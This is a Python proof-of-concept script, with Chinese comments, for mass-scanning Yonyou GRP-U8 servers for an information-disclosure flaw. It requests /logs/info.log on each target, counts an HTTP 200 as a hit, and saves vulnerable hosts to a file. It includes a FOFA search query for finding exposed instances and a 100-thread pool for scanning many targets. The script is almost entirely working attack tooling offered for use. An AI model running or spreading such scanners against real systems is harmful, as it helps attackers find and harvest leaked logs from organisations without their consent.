#用友GRP-U8存在信息泄露
#POC
# GET /logs/info.log HTTP/1.1
# FOFA:  body="U8Accid" || title="GRP-U8" || body="用友优普信息技术有限公司"
import requests,sys,json,argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test="""  ██████╗ ██████╗ ██████╗       ██╗   ██╗ █████╗ 
██╔════╝ ██╔══██╗██╔══██╗      ██║   ██║██╔══██╗
██║  ███╗██████╔╝██████╔╝█████╗██║   ██║╚█████╔╝
██║   ██║██╔══██╗██╔═══╝ ╚════╝██║   ██║██╔══██╗
╚██████╔╝██║  ██║██║           ╚██████╔╝╚█████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝            ╚═════╝  ╚════╝ 
                                                



"""
    print(test)
def main():
    banner()
    #处理命令行参数
    #初始化
    parser=argparse.ArgumentParser(description='用友GRP-U8存在信息泄露')
    #添加参数
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')

    args=parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/logs/info.log'
    try:
        res1=requests.get(url=target+payload)
    except:
        pass
    if res1.status_code==200:
        print(f"[+]目标存在： {target}")
        with open('result.txt','a') as f:
            f.write(target+'\n')
    else:
        print(f"[-]目标不存在： {target}")

if __name__ =='__main__':
    main()